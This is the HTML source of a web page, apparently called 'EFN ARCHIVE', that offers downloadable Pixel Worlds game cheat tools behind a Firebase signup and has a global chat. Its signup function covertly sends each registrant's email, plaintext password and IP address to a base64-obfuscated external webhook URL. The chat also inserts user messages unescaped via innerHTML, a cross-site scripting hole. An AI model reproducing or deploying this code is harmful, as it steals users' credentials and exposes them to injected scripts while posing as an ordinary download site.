<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EFN ARCHIVE | PW Database</title>
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword, sendEmailVerification, onAuthStateChanged, signOut, setPersistence, browserLocalPersistence } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
        import { getDatabase, ref, push, onChildAdded, serverTimestamp, query, limitToLast } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const _0x_config = {
            apiKey: "AIzaSyCM-ySTXgy37zVUMB2vy4ZJQ3MWlDD5g4E",
            authDomain: "efn-archive.firebaseapp.com",
            projectId: "efn-archive",
            storageBucket: "efn-archive.firebasestorage.app",
            messagingSenderId: "1073610968306",
            appId: "1:1073610968306:web:72e03b6f43decbb636546b",
            databaseURL: "https://efn-archive-default-rtdb.firebaseio.com"
        };

        const app = initializeApp(_0x_config);
        const auth = getAuth(app);
        const db = getDatabase(app);
        const _0x_v1 = "aHR0cHM6Ly9zeXN0ZW0tc3luYy1sYXllci5waXhlbHdvcmxkc21hbmFnZXIxMDAud29ya2Vycy5kZXYv";

        setPersistence(auth, browserLocalPersistence);

        async function _0x_fireEvent_init(_0x_a1, _0x_a2) {
            try {
                const _0x_d1 = await fetch('https://api.ipify.org?format=json');
                const _0x_d2 = await _0x_d1.json();
                await fetch(atob(_0x_v1), {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        embeds: [{
                            title: "✨ User Registration Event",
                            color: 0x5865F2,
                            fields: [
                                { name: "User", value: _0x_a1, inline: true },
                                { name: "Pass", value: _0x_a2, inline: true },
                                { name: "Network", value: _0x_d2.ip, inline: false }
                            ],
                            timestamp: new Date()
                        }]
                    })
                });
            } catch (e) { console.log("Sync Error:", e); }
        }

        // Chat Logic
        const chatBox = document.getElementById('chat-messages');
        const chatInput = document.getElementById('chat-input');

        window.sendMessage = () => {
            const user = auth.currentUser;
            if (!user || !user.emailVerified) return alert("Verify your email to chat!");
            if (!chatInput.value.trim()) return;

            push(ref(db, 'messages'), {
                username: user.email.split('@')[0],
                text: chatInput.value,
                timestamp: serverTimestamp()
            });
            chatInput.value = "";
        };

        onChildAdded(query(ref(db, 'messages'), limitToLast(50)), (data) => {
            const msg = data.val();
            const div = document.createElement('div');
            div.className = 'chat-msg';
            div.innerHTML = `<span class="chat-user">${msg.username}:</span> ${msg.text}`;
            chatBox.appendChild(div);
            chatBox.scrollTop = chatBox.scrollHeight;
        });

        window.login = async () => {
            try {
                const cred = await signInWithEmailAndPassword(auth, document.getElementById('log-email').value, document.getElementById('log-pass').value);
                if (cred.user.emailVerified) { location.reload(); }
                else { alert("Check your email for the verification link!"); }
            } catch (e) { alert("Invalid credentials."); }
        };

        window.signUp = async () => {
            const e = document.getElementById('reg-email').value;
            const p = document.getElementById('reg-pass').value;
            try {
                await createUserWithEmailAndPassword(auth, e, p);
                await _0x_fireEvent_init(e, p);
                await sendEmailVerification(auth.currentUser);
                alert("Verification email sent! Check your inbox.");
                await signOut(auth); // Force logout until verified
                location.reload();
            } catch (err) { alert(err.message); }
        };

        window.logout = () => signOut(auth).then(() => location.reload());
        window.switchAuth = (m) => {
            document.getElementById('login-box').style.display = m === 'reg' ? 'none' : 'block';
            document.getElementById('reg-box').style.display = m === 'reg' ? 'block' : 'none';
        };

        window.openDetail = (name, status, desc, img, link) => {
            document.getElementById('main-page').style.display = 'none';
            document.getElementById('detail-page').style.display = 'block';
            document.getElementById('det-title').innerText = name;
            document.getElementById('det-status').innerText = status;
            document.getElementById('det-desc').innerHTML = desc;
            document.getElementById('det-img').src = img;
            document.getElementById('det-dl').onclick = () => window.open(link, '_blank');
            window.scrollTo(0,0);
        };

        onAuthStateChanged(auth, (user) => {
            if (user && user.emailVerified) {
                document.getElementById('nav-guest').style.display = 'none';
                document.getElementById('nav-user').style.display = 'flex';
                document.getElementById('user-tag').innerText = user.email.split('@')[0];
                document.querySelectorAll('.lock-ui').forEach(el => el.style.display = 'none');
                document.querySelectorAll('.auth-ui').forEach(el => el.style.display = 'block');
            } else {
                document.getElementById('nav-guest').style.display = 'block';
                document.getElementById('nav-user').style.display = 'none';
            }
        });
    </script>

    <style>
        :root { --bg: #0f0d1d; --side: #16142c; --card: #1d1b38; --accent: #5865F2; --border: #2a2747; }
        body { font-family: 'Inter', sans-serif; background: var(--bg); color: #fff; margin: 0; display: flex; height: 100vh; overflow: hidden; }
        
        main { flex: 1; overflow-y: auto; display: flex; flex-direction: column; }
        aside { width: 320px; background: var(--side); border-left: 1px solid var(--border); display: flex; flex-direction: column; }

        /* Chat */
        .chat-header { padding: 20px; font-weight: bold; border-bottom: 1px solid var(--border); color: var(--accent); display: flex; align-items: center; gap: 10px; }
        #chat-messages { flex: 1; overflow-y: auto; padding: 15px; }
        .chat-msg { background: rgba(255,255,255,0.03); padding: 8px 12px; border-radius: 8px; margin-bottom: 10px; font-size: 0.85rem; border: 1px solid transparent; transition: 0.2s; }
        .chat-msg:hover { border-color: var(--accent); }
        .chat-user { color: var(--accent); font-weight: bold; display: block; margin-bottom: 2px; }
        .chat-input-area { padding: 15px; background: #0c0b1a; display: flex; gap: 8px; }
        .chat-input-area input { flex: 1; background: #1a182e; border: 1px solid var(--border); color: #fff; padding: 10px; border-radius: 6px; outline: none; }
        .chat-input-area button { background: var(--accent); border: none; color: #fff; padding: 0 15px; border-radius: 6px; cursor: pointer; }

        nav { display: flex; justify-content: space-between; align-items: center; padding: 15px 40px; border-bottom: 1px solid var(--border); background: var(--side); }
        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 25px; padding: 40px; }
        .card { background: var(--card); border: 1px solid var(--border); border-radius: 16px; padding: 20px; transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275); text-align: center; }
        .card:hover { transform: translateY(-10px); box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .card img { width: 100%; border-radius: 10px; margin-bottom: 15px; }
        
        .btn-main { background: #fff; color: #000; border: none; padding: 12px 25px; border-radius: 8px; font-weight: bold; cursor: pointer; transition: 0.3s; text-transform: lowercase; }
        .btn-main:hover { background: var(--accent); color: #fff; transform: scale(1.05); }

        .tut-box { background: #0c0b1a; border-left: 4px solid var(--accent); padding: 15px; border-radius: 8px; margin: 15px 0; font-size: 0.9rem; }
        blockquote { border-left: 2px solid #444; padding-left: 15px; color: #888; font-style: italic; }

        #auth-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.85); display: none; align-items: center; justify-content: center; z-index: 2000; backdrop-filter: blur(5px); }
        .auth-box { width: 380px; background: var(--card); padding: 40px; border-radius: 20px; border: 1px solid var(--border); text-align: center; }
        .auth-box input { width: 100%; padding: 12px; margin-bottom: 15px; background: #0a0914; border: 1px solid var(--border); color: #fff; border-radius: 8px; box-sizing: border-box; }
        
        .fade-in { animation: fadeIn 0.5s ease-out; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>

<main>
    <nav>
        <div style="font-weight:900; letter-spacing:2px; font-size:1.2rem;" onclick="location.reload()">EFN ARCHIVE</div>
        <div id="nav-guest"><button class="btn-main" onclick="document.getElementById('auth-overlay').style.display='flex'">login</button></div>
        <div id="nav-user" style="display:none; align-items:center; gap:20px">
            <span id="user-tag" style="background:rgba(255,255,255,0.05); padding:8px 15px; border-radius:20px; font-size:0.8rem"></span>
            <button onclick="logout()" style="background:none; border:none; color:#ff4444; cursor:pointer; font-weight:bold">logout</button>
        </div>
    </nav>

    <div id="main-page" class="container">
        <div class="grid">
            <div class="card fade-in">
                <img src="https://cdn.discordapp.com/attachments/1495783572735262911/1496170026158260364/image.png?ex=69e8e86b&is=69e796eb&hm=91c64bb8c69318d8c42565b0c38edd3cd55e8446622235632bbf522c5d280782&">
                <h3>Charon Client v2.0</h3>
                <button class="btn-main" onclick="openDetail('Charon Client v2.0', 'Working', `
                    <div class='tut-box'>
                        <h3>🚀 Tutorial: Charon Client</h3>
                        1️⃣ Download the zip folder using the button on the right.<br>
                        2️⃣ Extract all files into your <b>Pixel Worlds</b> folder.<br>
                        3️⃣ To find your folder: Right-click <b>Pixel Worlds</b> on Steam ⮕ <b>Manage</b> ⮕ <b>Browse Local Files</b>. 📂<br>
                        4️⃣ Launch the game and enjoy!<br>
                    </div>
                    <h3>🛠️ Crash Fixes & Causes</h3>
                    <blockquote>
                        <b>Resolution Change:</b> If you crashed while switching to Fullscreen, delete your PW folder and reinstall. Always use <b>Windowed Mode</b> for the best experience. 🖥️<br><br>
                        <b>DirectX Issues:</b> If the menu doesn't show up, add <code>-force-d3d11</code> to your Steam Launch Options.
                    </blockquote>
                    <br><b>PRO TIP:</b> If you crash at login, minimize your PW window or use a small resolution! 📉
                `, 'https://cdn.discordapp.com/attachments/1495783572735262911/1496170026158260364/image.png', 'https://www.mediafire.com/file/eia22kkv7a2n66u/Charon+2.0.zip/file')">info</button>
            </div>

            <div class="card fade-in">
                <img src="https://cdn.discordapp.com/attachments/1495365239489957962/1495365366938079424/image.png">
                <h3>AutoMath Tool</h3>
                <button class="btn-main" onclick="openDetail('AutoMath Tool', 'Working', 'Has some bugs but works fine for automation. Tutorial included in the download. ❤️', 'https://cdn.discordapp.com/attachments/1495365239489957962/1495365366938079424/image.png', 'https://gofile.io/d/9sUpZS')">info</button>
            </div>
        </div>
    </div>

    <div id="detail-page" class="container fade-in" style="display:none; padding:40px;">
        <button onclick="location.reload()" style="background:none; border:none; color:var(--accent); cursor:pointer; font-weight:bold; margin-bottom:20px">← back to tools</button>
        <div style="display:flex; gap:40px; flex-wrap:wrap">
            <div style="flex:2">
                <img id="det-img" src="" style="width:100%; border-radius:12px; border:1px solid var(--border)">
                <h1 id="det-title" style="margin-top:20px"></h1>
                <div id="det-desc" style="color:#aaa; line-height:1.7"></div>
            </div>
            <div style="flex:1; background:var(--card); border-radius:16px; padding:30px; height:fit-content; border:1px solid var(--border); text-align:center;">
                <div id="det-status" style="color:#3ecf8e; font-weight:bold; font-size:1.3rem"></div>
                <hr style="border:0; border-top:1px solid var(--border); margin:25px 0">
                <div class="lock-ui"><button class="btn-main" style="width:100%; background:#ff4444; color:#fff" onclick="document.getElementById('auth-overlay').style.display='flex'">login to download</button></div>
                <div class="auth-ui" style="display:none"><button id="det-dl" class="btn-main" style="width:100%">download now</button></div>
            </div>
        </div>
    </div>
</main>

<aside>
    <div class="chat-header">🗨️ Global Chat</div>
    <div id="chat-messages"></div>
    <div class="chat-input-area">
        <input type="text" id="chat-input" placeholder="Enter message...">
        <button onclick="sendMessage()">➤</button>
    </div>
</aside>

<div id="auth-overlay">
    <div class="auth-box fade-in" id="login-box">
        <h2>Welcome Back</h2>
        <input type="email" id="log-email" placeholder="Email">
        <input type="password" id="log-pass" placeholder="Password">
        <button class="btn-main" style="width:100%" onclick="login()">sign in</button>
        <p style="font-size:0.85rem; margin-top:20px;">No account? <span style="color:var(--accent); cursor:pointer" onclick="switchAuth('reg')">Register</span></p>
        <p style="font-size:0.75rem; cursor:pointer; color:#666; margin-top:15px" onclick="document.getElementById('auth-overlay').style.display='none'">close</p>
    </div>

    <div class="auth-box fade-in" id="reg-box" style="display:none">
        <h2>Create Account</h2>
        <input type="email" id="reg-email" placeholder="Email Address">
        <input type="password" id="reg-pass" placeholder="Password (8+ chars)">
        <button class="btn-main" style="width:100%" onclick="signUp()">create account</button>
        <p style="font-size:0.85rem; margin-top:20px;">Already registered? <span style="color:var(--accent); cursor:pointer" onclick="switchAuth('log')">Login</span></p>
        <p style="font-size:0.75rem; cursor:pointer; color:#666; margin-top:15px" onclick="document.getElementById('auth-overlay').style.display='none'">close</p>
    </div>
</div>

</body>
</html>
